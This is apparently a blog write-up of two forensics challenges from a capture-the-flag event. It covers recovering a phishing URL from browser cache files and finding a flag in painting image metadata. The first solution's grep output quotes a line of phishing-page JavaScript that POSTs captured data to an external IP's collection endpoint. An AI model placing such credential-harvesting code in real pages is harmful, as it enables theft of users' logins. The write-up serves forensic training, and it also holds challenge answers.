---
layout: post
title:  "Forensics Challenges"
date:   2026-10-20 20:54:00 -0400
author: uzi
tags: [CTF]
permalink: /deadface-ctf-2026-forensics/
---
* TOC
{:toc}

## Hooked

**Category**: forensics

**Created By**: `@saran s`

**Description**: De Monne Financial has detected suspicious outbound traffic originating from workstation `DEMONNE-WS04`, assigned to employee Fletcher Kampeter in the Finance division. A credential submission was logged against an unknown external host at _10:23 AM on March 14, 2025_ - during normal business hours. Browser artifacts have been imaged from the machine and packaged for analysis.

DEADFACE is suspected of running a targeted spearphishing campaign against De Monne personnel. It's unclear how deep the access goes, but finding the entry point is the first step. Inspect the artifacts. Find the URL the employee clicked.

Your task is to identify the suspicious URL from the phishing email that the employee clicked on. Recover it from the browser web artifacts and submit it as the flag.

Example: `deadface{http://suspicious-url.example.com/path?param=value}`

I get the challenge files:
```shell
unzip CTF_Caches_Kampeter_1.zip  
Archive:  CTF_Caches_Kampeter_1.zip  
  inflating: ctf_artifacts/Chrome/User Data/Default/History  
  inflating: ctf_artifacts/Chrome/User Data/Default/Cookies  
  inflating: ctf_artifacts/Chrome/User Data/Default/Login Data  
  inflating: ctf_artifacts/Chrome/User Data/Default/Cache/f_000007  
  inflating: ctf_artifacts/Chrome/User Data/Default/Cache/f_000002  
  inflating: ctf_artifacts/Chrome/User Data/Default/Cache/f_000009  
  inflating: ctf_artifacts/Chrome/User Data/Default/Cache/f_000003  
  inflating: ctf_artifacts/Chrome/User Data/Default/Cache/f_000008  
  inflating: ctf_artifacts/Chrome/User Data/Default/Cache/f_000006  
  inflating: ctf_artifacts/Chrome/User Data/Default/Cache/f_000005  
  inflating: ctf_artifacts/Chrome/User Data/Default/Cache/f_000001  
  inflating: ctf_artifacts/Chrome/User Data/Default/Cache/f_000004
```

I just used `grep` to find the link:
```shell
grep -r "http://"  
grep: Chrome/User Data/Default/History: binary file matches  
grep: Chrome/User Data/Default/Login Data: binary file matches  
Chrome/User Data/Default/Cache/f_000007:url: http://demonne-secure-portal.net/assets/demonne_logo_fake.png  
Chrome/User Data/Default/Cache/f_000009:url: http://cdn-assets.demonne-secure-portal.net/js/portal.min.js  
Chrome/User Data/Default/Cache/f_000009:/* portal v1.2 */ var _c=function(e){var x=new XMLHttpRequest();x.open('POST','http://185.220.101.47/collect',true);x.send(JSON.stringify(e));};  
Chrome/User Data/Default/Cache/f_000008:url: http://demonne-secure-portal.net/auth/redirect?session=9f3a22cd&status=ok  
Chrome/User Data/Default/Cache/f_000006:url: http://demonne-secure-portal.net/login?ref=vpn_auth&token=df4e91bc
```

`deadface{http://demonne-secure-portal.net/login?ref=vpn_auth&token=df4e91bc}`

___

## Art Heist: The Forgery

**Category**: forensics

**Created By**: `@syyntax`

**Description**: The Turla Museum recently welcomed back five paintings from its Cyber Impressionism collection following a loan to a neighboring gallery. But museum officials have received intelligence suggesting that DEADFACE infiltrated the gallery during the exhibition and secretly replaced one of the original paintings with a forgery.

All five paintings were scanned and entered into the museum's digital archive upon their return. Although the artwork appears authentic, investigators suspect that the forger left behind traces of their work in the digital records.

The museum has provided copies of all five images and needs your help identifying the compromised artwork.

Can you determine which painting was forged and recover the flag left behind?

Download and unzip the challenge files:
```shell
unzip CTF_Forgery_Paintings.zip  
Archive:  CTF_Forgery_Paintings.zip  
   creating: CTF_Forgery_Paintings/  
  inflating: CTF_Forgery_Paintings/.DS_Store  
  inflating: __MACOSX/CTF_Forgery_Paintings/._.DS_Store  
  inflating: CTF_Forgery_Paintings/Painting_005.png  
  inflating: __MACOSX/CTF_Forgery_Paintings/._Painting_005.png  
  inflating: CTF_Forgery_Paintings/Painting_004.png  
  inflating: __MACOSX/CTF_Forgery_Paintings/._Painting_004.png  
  inflating: CTF_Forgery_Paintings/Painting_003.png  
  inflating: __MACOSX/CTF_Forgery_Paintings/._Painting_003.png  
  inflating: CTF_Forgery_Paintings/Painting_002.png  
  inflating: __MACOSX/CTF_Forgery_Paintings/._Painting_002.png  
  inflating: CTF_Forgery_Paintings/Painting_001.png  
  inflating: __MACOSX/CTF_Forgery_Paintings/._Painting_001.png
```

```shell
strings * | grep "deadface{"  
  <dc:identifier>deadface{L4MIA_SIGNS_HER_WORK}</dc:identifier>
```

`deadface{L4MIA_SIGNS_HER_WORK}`
